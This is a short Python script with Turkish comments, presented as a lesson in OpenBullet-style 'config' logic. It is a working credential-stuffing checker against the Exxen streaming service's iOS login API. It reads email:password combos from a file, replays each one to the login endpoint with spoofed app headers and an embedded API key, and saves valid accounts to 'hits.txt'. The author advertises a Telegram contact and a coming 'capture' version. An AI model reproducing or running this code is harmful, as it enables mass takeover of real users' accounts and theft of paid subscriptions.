####### requests modülünü kurmanız gerekir  pip install requests #######
####### colorama modülünü kurmanız gerekir  pip install colorama #######

import requests
from colorama import Fore

####### AÇIKLAMA #######

logo="""
        OPENBULLET SİLVERBULLET GİBİ PROGRAMLARDAKİ CONFİG MANTIĞINI SİZE SUNUYORUM
        POST URL , POST DATA , KEYCHECK , HEADERS İLE ZATEN BİR CONFİG YAPILIYOR GENELİ BÖYLE 

        CHECKER İOS APİ'DİR

        UFAK BİR EXXEN CHECKER BİR KAÇ GÜNE CAPTURE HALİNİDE GÖSTERİCEM
        DİĞER GÖSTERENLER GİBİ ÇOK KARIŞIK BİR CHECKER DEĞİL 
        BİRAZ PYTHON BİLGİNİZ VARSA YAPARSINIZ ZATEN
        HERHANGİ BİR SORUN SIKINTIDA YAZABİLİRSİNİZ 
        TELEGRAM ID : @Furkiniz
"""
print(Fore.YELLOW +logo)

####### EXXEN CHECKER #######

def check(email,password):
    client = requests.session()

####### HEADERS #######

    h1 = {
        "Host": "api-crm.exxen.com",
        "Origin": "com.exxen.ios",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Exxen/1.0.23 (com.exxen.ios; build:5; iOS 15.5.0) Alamofire/5.4.4",
        "Accept-Language": "tr-TR;q=1.0",
        "Cache-Control": "no-cache",
        "Connection": "close"

    }

####### POST DATA #######

    data = {
        
        "Email":email,
        "Password":password,
        "RememberMe":"true"
        
    }
    

####### POST URL #######   

    login = client.post('https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764',data=data,headers=h1)
   



####### FAİL KEY #######
    if 'Success":false' in login.text:
        print('False: '+email+':'+password)

####### SUCCES KEY #######

    elif 'Success":true' in login.text:
        print(Fore.YELLOW + 'Hits: '+email+ ':' +password)
        filee = open('hits.txt','a')
        filee.write('Hits: '+email+ ':' +password+'\n' )


####### combo'nuzun ismi combos.txt olması gerek #######

file = open('combos.txt', 'r').readlines()
for i in file:
    seq = i.strip()
    acc = seq.split(':')
    check(acc[0],acc[1])
